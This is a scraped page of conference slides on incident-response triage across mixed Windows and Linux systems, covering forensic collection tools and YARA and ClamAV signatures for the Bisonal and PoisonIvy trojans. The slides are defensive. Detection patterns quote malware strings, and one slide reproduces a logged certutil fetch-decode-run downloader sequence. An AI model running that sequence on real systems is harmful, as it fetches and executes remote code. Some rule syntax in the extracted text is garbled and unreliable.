 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-18-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-18-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-18-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-18-2048.jpg 2048w"/></div><div></div></div><div id="slide19" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-18" alt="YARA RULES
rule Trojan.Bisonal {
strings:
$s1 = &quot;wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo&quot; wide ascii
$s2 = &quot;defa&quot; wide ascii
$s3 = &quot;love a meng&quot; wide ascii
$s4 = &quot;HE@L-PShellE&quot; wide ascii
$s5 = &quot;xecut&quot;
$s6 = &quot;wkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo&quot; wide ascii
$s7 = &quot;http://%s/%s.asp?id=%s%s%s&quot;
$s8 = &quot;http://%s/a.asp?id=%s%s&quot;
$s9 = &quot;c:a1.txt“
condition:
($s1 and $s2) or ($s2 and $s3) or ($s4 and $5) and ($s6 and $s7 and $s8 and $s9) and
// MZ signature at offset 0 and ...
uint16(0) == 0x5A4D and
// ... PE signature at offset stored in MZ header at 0x3C
uint32(uint32(0x3C)) == 0x00004550
}
Trojan.Bisonal family
the first two strings are
common to other Bisonal
samples, but not all.
The latest samples contain different
strings, except for $s6 string which is
very similar to the first string in
conditition $s1.
These strings match a Bisonal sample
that uses a common obfuscation
techniques(split a word in more
lines).
Beyond the common string “defa” the
samples of bisonal present different
string.

Trojan.Bisonal family
rule campaignA {
strings:
$s00 = &quot;Flag:8080&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4

$s00 = &quot;Flag:84d&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}

strings:
$s00 = &quot;flag:boat&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4
}

$s00 = &quot;Flag:d2&quot; ascii wide nocase
condition:
all of them and
uint16(0) == 0xC3D4

all of them and
uint16(0) == 0xC3D4

21
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-21-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-21-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-21-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-21-2048.jpg 2048w"/></div><div></div></div><div id="slide22" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-21" alt="22
Clam AV: Intro
• ClamAV is an open source and free anti-virus program.
• ClamAV runs on Windows (ClamWin), Linux, BSD, Solaris, and Mac OS X, and its
mainly designed to scan email attachment, but it can be used as a regular anti-
virus.
• ClamAV includes:
• Features
• Can search archives
• Can search multiple file types
• Multithreaded
 Clamscan
 Clamdscan/Clamd
 Freshclam
Command line virus scanner
Client/Server virus scanner
tool to update the virus definition database
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-22-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-22-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-22-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-22-2048.jpg 2048w"/></div><div></div></div><div id="slide23" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-22" alt="23
YARA Rules, AIOCs and ClamAV
• Yara is the swiss army knife for any low-cost triage and can be applied to many
endpoint forensic platforms.
• Values that work across multiple platforms
• Text strings
• Hex values that are in multiple versions of the binary
• ClamAV provides combination of both worlds.
• By empowering ClamAV with Yara rules, we are able to run massive triage on almost all type
of system using AIOCs we have developed.
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-23-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-23-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-23-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-23-2048.jpg 2048w"/></div><div></div></div><div id="slide24" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-23" alt="Using ClamAV to Scan for Badness
clamscan --infected --recursive --allmatch –archive
-verbose --database ./{yara sigs}.yara {starting directory} |
tee clamav_{date}_yara
clamscan --infected --recursive --allmatch --archive-verbose
--database ./{clamav sigs}.ldb {starting directory} | tee
clamav_{date}_sigs

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-26-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-26-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-26-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-26-2048.jpg 2048w"/></div><div></div></div><div id="slide27" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-26" alt="Sigtool: ClamAV command line
27
Sigtool
(signature and database
management tool)
Signature using the hash of
the PE-section of an
executable
Signature using full MD5
hash of file
Signature using the a hex
fragment of a file
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-27-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-27-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-27-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-27-2048.jpg 2048w"/></div><div></div></div><div id="slide28" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-27" alt="C:Documents and SettingsuserDesktop&gt; sigtool --md5 malware.exe &gt;&gt; sigFile.hdb
C:Documents and SettingsuserDesktop&gt;type sigFile.hdb
B4619d8058362b38d20480c14d30c209:40500:malware.exe
C:Documents and SettingsuserDesktop&gt; sigtool --mdb malware.exe.text.dat &gt;&gt;
sigFile.mdb
• To create a unique signature for an executable file we use the --md5 option of
sigtool, and then save the output into a file with a “.hdb” extension.
• To create a signature that will match a particular PE section (typically the sections are
labelled .text, .rdata, .data, .idata, etc.), use the “--mdb” option of sigtool and then save
the output into a “.mdb” file. The easiest way to generate MD5 based section signatures is
to extract target PE sections into separate files.
Sigtool: Command explained
28
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-28-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-28-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-28-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-28-2048.jpg 2048w"/></div><div></div></div><div id="slide29" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-28" alt="C:Documents and SettingsuserDesktop&gt; echo I am malware | sigtool --hex-dump
4920616d2061206d616c77617265200d0a
C:Documents and SettingsuserDesktop&gt; echo
testSig:0:*:4920616d2061206d616c77617265200d0a &gt;&gt; sigFile.ndb
• The last method is to use Body-based signatures in an hexadecimal format.
It relies on extracted strings from the body of the file.
• In the next example we create an hex dump of the string “I am malware”.
• Next we save the signature that has the format called “Extended Signature”:
MalwareName:TargetType:Offset:HexSignature and redirect the
output to a file “.ndb”.
Sigtool: Command explained

 Psexec can execute remote commands
and so start the scan on every computer
of a network.
 To use Psexec, the user must have rights
to access the filesystem of the target
computer.
&gt; psexec 192.168.81.128 -u administrator -p p4ssw0rd1! &quot;C:Program Files (x86)ClamAV
clamscan&quot; -r -d C:bioazih.ndb C:
&gt; psexec DESTINATIONIP -u USER -p PASSWORD “REMOTE_PATH_TO_CLAMSCAN&quot; -r -d
LOCAL_PATH_TO_CLAMAV_DATABASE_FILE REMOTE_PATH_TO_SCAN
Psxec machine
with ClamAV DB
Scanned Host 1
Scanned Host 2

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-33-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-33-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-33-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-33-2048.jpg 2048w"/></div><div></div></div><div id="slide34" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-33" alt="ClamAV PoisonIvy variants signature
PoisonIvy2015:0:*:257375706461746525346425303264253032642530326425303264253032642e746d70*434f4e4e4543542025733a256920485454502f2f312e30
PoisonIVY2011:0:*:202f632064656c202573203e206e756c*25752e3139332e25642e2564*47455420257320485454502f312e31*757564646f7362656174
PoisonIVY2011UPX:0:*:76727937666f2f55524c446f776e657a7b*365c5c7525752e3139332e2564
The second part contains instead
“CONNECT %s:%i HTTP//1.0”
The first Rule contains two non-successive strings divided by the symbol “*”. The first
string translated from hexadecimal contains the word
“%supdate%4d%02d%02d%02d%02d%02d.tmp”.
This rule takes a Poison Ivy sample dated 2011 and we use 3 different
strings. The first is “/c del %s &gt; nul”
The second strings is
“GET %s HTTP/1.1”
The last matches to
“uuddosbea”
The third rule is the same sample
mentioned above, but without the
package UPX. The first of two strings
is “vry7fo/URLDownez{”
The second strings is
“6u%u.193.%d”

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-34-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-34-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-34-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-34-2048.jpg 2048w"/></div><div></div></div><div id="slide35" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-34" alt="ClamAV Bisonal - logic signature
BISONAL;Target:1;(0&amp;1&amp;2)|(0&amp;2&amp;3)|(4&amp;5)|(6&amp;7&amp;8);534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e;776b6
b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6c6f;633a5c77696e646f77735c7461736b735c646566612e6578
65;6c6f76652061206d656e67;4845404c2d505368656c6c45;7865637574;776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306
730702f317e6c6f;687474703a2f2f25732f25732e6173703f69643d257325732573;633a5c615c322e747874
BISONAL;Target:1;(0&amp;1&amp;2)|(0&amp;2&amp;3)|(4&amp;5)|(6&amp;7&amp;8)
This is a ClamAV “Body-based”, slightly different, from
the previous one. It has to be put inside a “.LDB” file
and it is possible to use logic operators inside the rule.
Logical operators in action within the BISONAL signature.
Numbers are placeholders for the hex strings.
Match IF found: (both strings 0,1 and 2) OR (both strings
0,2 and 3) OR (only strings 4 and 5) OR (both strings 6,7
and 8).
534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e =
SOFTWAREMicrosoftWindowsCurrentVersionRun
776b6b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6
c6f = wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo
633a5c77696e646f77735c7461736b735c646566612e657865 = c:windowstasksdfea.exe
6c6f76652061206d656e67 = love a meng
4845404c2d505368656c6c45 = HE@L-PShellE
7865637574 = xecut
776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306730702f317e6c6f =
wkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo
687474703a2f2f25732f25732e6173703f69643d257325732573 = http://%s/%s.asp?id=%s%s%s
633a5c615c322e747874 = c:a2.txtz

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-35-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-35-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-35-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-35-2048.jpg 2048w"/></div><div></div></div><div id="slide36" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-35" alt="ClamAV and Forensics
● ClamAV can help with Forensics investigations
– Can detect badness in log files
– Example Find:
● Find in the section C of the modsec logs:
●/var/log/httpd/modsec_audit.log: Win.Downloader.CertutilURLCache-6335697-0 FOUND
●certutil -urlcache -split -f http://xx.xx.xx.xx/update.b64 update.b64
●certutil -decode update.b64 update.exe
●update.exe
36
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-36-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-36-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-36-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-36-2048.jpg 2048w"/></div><div></div></div><div id="slide37" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-36" alt="• Actionable IOCs is an answer to the need of solid indicators to support the investigation, the
attribution and the triage, of incidents generated by malicious actors.
• The adoption of this methodology can positively impact investigation and triage, but also
improves knowledge of the tools and strategies adopted by the adversaries.
• The formalization process behind it can facilitate the exchange of information and
indicators without the risk of unintentional leakage of sensitive information and, in short,
strengthen the proactive and reactive capabilities of any structure.
Where are we heading
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-37-320.jpg" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-37-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-37-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-37-2048.jpg 2048w"/></div><div></div></div><div id="slide38" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-37" alt="Thanks!
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" fetchpriority="auto" loading="lazy" sizes="100vw" Button_secondary__hHiHI Button_text__ZT_3O Button_small__sqsEx Button_icon__1C4qi save-slideshow-button" aria-checked="false" aria-label="Save Be ready for tomorrow’s needs with a longer-lasting, style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/bookmark.caa7ecda.svg)"></span><span class="sr-only"></span></span></span></span></button><div class="Tooltip_root__7FS0Y" id=":R5q6jcdr6:" popover="auto" data-popover-position="top" style="position-anchor:--popover-R5q6jcdr6"></div><div class="SlideshowFooter_root__P1vQd"><div class="SlideshowAuthor_root__IkT1_"><a class="link Link_root__vn3ab SlideshowAuthor_link__tzIw3 slideshow-author ellipsis Link_primary__Iq4CI weight-medium Link_medium__PK_qw" data-testid="slideshow-author" data-cy="slideshow-author" href="https://www.slideshare.net/PrincipledTechnologies">Principled Technologies</a></div><div class="slideshow-stats SlideshowStats_root__EQOR1"> </div></div></div></div></div><button aria-label="Previous" type="button" class="Slider_arrow__8LCca Slider_prev__YMssa Slider_hidden__rs7nK"><span class="icon Icon_root__AjZyv" style="--size:16px"><span class="Icon_icon__4zzsG"><span class="Icon_mask__bniyY" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/chevron-left.3e0951f4.svg)"></span><span class="sr-only"></span></span></span></button><button aria-label="Next" type="button" class="Slider_arrow__8LCca Slider_next__fa9IO"><span class="icon Icon_root__AjZyv" style="--size:16px"><span class="Icon_icon__4zzsG"><span class="Icon_mask__bniyY" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/chevron-right.5b60305f.svg)"></span><span class="sr-only"></span></span></span></button></div></div></div></div></div></div></div><div><div class="transcript Transcript_root__Vrf6Q"><div class="Transcript_wrapper__gIgMH"><h2 class="heading Heading_root__KdmZo weight-light Heading_xxsmall__oA9Tv"><span class="icon Icon_root__AjZyv" style="--size:24px"><span class="Icon_icon__4zzsG"><span class="Icon_mask__bniyY" style="mask-image:url(https://public.slidesharecdn.com/_next/static/media/file.d43bb72d.svg)"></span><span class="sr-only"></span></span></span>BSides IR in Heterogeneous Environment</h2><ul class="Transcript_list__faItj" style="--bullet-size:2ch"><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">1. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#1">Practical Incident Response</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">in
Heterogeneous Environment
Keven Murphy &amp; Stefano Maccaglia
1
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">2. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#2">The mass-triage problem</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">in 2018
• The investigation process (Triage), in any IT incident, is the key to solve the case and
to clean all the affected systems.
• But in heterogeneous environments, where Windows, Linux, Mac OS, and Unix
systems are potentially affected by the attacker, the investigation process is slowed
by a number of technical complexities.
 First problem is related to a common platform and procedure to adopt for the triage as many
technologies are capable of covering only a portion of the environment.
 Second problem, what to look for, as the triage is aimed to identify malicious artifacts and usual
technologies are not providing flexibility and agility to shape the triage process.
 Third problem, the capability to search the heterogeneous environment using custom IOCs.
 Fourth problem, the possibility to pinpoint known badness which allows for easier mitigation.
• In our approach, the IOCs play an important role both for the investigation process
and the definition of the best way to approach the triage. We were looking to a
“rule them all” solution aimed to overcome traditional limitations of the most
common commercial solutions.
2
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">3. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#3">Traditional IOCs application
•</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">The traditional IR approach:
• Context, in regard of IOCs, typically does not exists.
• Application of IOCs to the environment is rule-based
• Customization of IOCs are not an option in some commercial products.
• Rule-based detection will miss changes made to the actor’s tools
3
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">4. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#4">Our idea
• The</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">production of code leaves traces in any binary.
• The binary can contain debugging symbols, which give you a lot of information.
• Often the attacker tools include the use of specific libraries or functions.
• A lot of fingerprinting can be done with software, an this is very useful for IR
analyses.
• The combined information of both can help to solve the attribution problem.
• Helps with assessment of risks
• Identifying end goals for known actors
• Aid the creation of IOCs that are “actionable” and not “disposable”
4
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">5. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#5">RIFT (Retrieve Interesting</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">Files Tool)
● Retrieves files/directories based on regex list
● Uses Sleuthkit to retrieve files forensically
● Outputs files files into a directory (machine name)
● Retrieved files are saved remote share/USB
● Recreates the directory structure of where the file was found
● To run:
● Download:
rift --verbose --savedrive [SAVEDRIVE]
https://github.com/chaoticmachinery/frac_rift
5
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">6. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#6">Getfileslist.txt examples
● “getfileslist.txt”</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">contains a regex list of files and directories that RIFT will retrieve
6
ntuser.dat$
system32/winevt/logs/
^/etc/
.ssh
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">7. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#7">FRAC (Forensic Response</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">ACquisition)
● Uses RIFT to forensically retrieve files/directories across the network
● Recommend using PAExec or SSH/SSHPASS to connect to remote machines
● Requires local admin rights and remote share (SMB/NFS depending on OS)
● Supports single IP, CIDR notation, and IP range like the following examples:
● Can be used to execute any command on remote machines
● To run:
–172.16.10.12
–172.16.10.1/24
–172.16.10.1-172.16.10.230
frac_v0.05 --iplist iplist.txt --cmd cmd.txt –verbose
paexec.exe [IP] -n 4 -u [ADMINID] -p [ADMINPASS] -s cmd /C &quot;net use
[SHAREDRV] /delete /yes &amp; net use [SHAREDRV] [SHARE]
/user:[SHAREUSERID] [SHAREPASSWD] &amp;&amp; cd /d [SAVEDRIVE] &amp;&amp; rift.exe --
verbose --savedrive [SAVEDRIVE] &amp;&amp; net use [SHAREDRV] /delete /yes&quot;
sshpass -p [ADMINPASS] ssh [IP] &quot;mkdir [SHAREDRV];mount [MNTOPTS]
[SRCBOX]:[SRCMNT] [SHAREDRV] ; cd [SHAREDRV]/frac_v0.05 &amp;&amp; ./rift --
verbose --savedrive [SAVEDRIVE] ; cd / &amp;&amp; umount [SHAREDRV] &amp;&amp; rmdir
[SHAREDRV]&quot;
Examples
of
Cmd.Txt
7
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">8. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#8">FRAC (Forensic Response</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">Acquisition): The Output
● FRAC/RIFT creates directories with the hostname of the machine
drwxr-xr-x 7 root root 4096 Apr 11 19:39 machinea_04112018_19-18-58
drwxr-xr-x 9 root root 4096 Apr 11 20:11 machineb_04112018_15-19-02
drwxr-xr-x 135 root root 20480 Apr 11 19:37 etc
-rw-r--r-- 1 root root 675539 Apr 11 19:40 getfiles.txt
drwxr-xr-x 3 root root 4096 Apr 11 19:37 home
drwxr-xr-x 3 root root 4096 Apr 11 19:37 opt
drwxr-xr-x 5 root root 4096 Apr 11 19:21 root
-rw-r--r-- 1 root root 230661477 Apr 11 19:43 machineb_04112018_15-19-28_fls.out
drwxr-xr-x 5 root root 4096 Apr 11 19:38 usr
drwxr-xr-x 5 root root 4096 Apr 11 19:40 var
Getfiles.txt
Contains the mactime information for all of the files retrieved as well as the inode
*fls.out
Contains the fls.out (mactime) output from the Sleuthkit FLS command.
All of the directory structure is recreated and files are forensically copied to where
they existed on the drive.
8
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">9. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#9">Actionable IOCs (AIOCs)
•</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">The concept of “actionable” IOCs has been derived and refined from a collective set of
Incident Response investigations, and could become a valid support of our investigative
process if organized in a scientifically sound approach.
• Utilizes procedures, analysis, and evidence for a methodical approach
• Based on positive matches can help identify the attacker
• It allow the creation of a structured knowledge base of attackers
• The knowledge base allows the creation of attacker profiles
9
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">10. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#10">Malware analysis process</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">to build AIOCs
10
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">11. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#11">Example: PoisonIvy
• PoisonIvy,</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">a Remote Access Tool/Trojan (RAT) often used in targeted attacks, had been
widely seen until around 2013.
• Since then, the number of cases using PoisonIvy decreased, and there was no special
variant with expanded features seen in the wild.
• However, recently, we identified PoisonIvy with expanded features in its communication
function capable to bypass HTTP/HTTPS proxy in APT and cybercriminal attacks thanks to
modifications in the malware code.
Latest PoisonIvy variants are different
11
 </span></div></li><li class="TranscriptItem_root__SYFxL"><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">12. </span><div><a class="link Link_root__vn3ab Link_primary__Iq4CI weight-bold Link_medium__PK_qw" href="https://www.slideshare.net/slideshow/bsides-ir-in-heterogeneous-environment/97098401#12">YARA RULES
PoisonIvy typical</a><span class="text Text_root__RtCPC weight-regular Text_small__HLf8O">IOC

{

rule PoisonIvy_2
{
meta:
author = &quot; Kevin Breen &lt;kevin@techanarchy.net&gt;&quot;
date = &quot;2014/04&quot;
ref = &quot;http://malwareconfig.com/stats/PoisonIvy&quot;
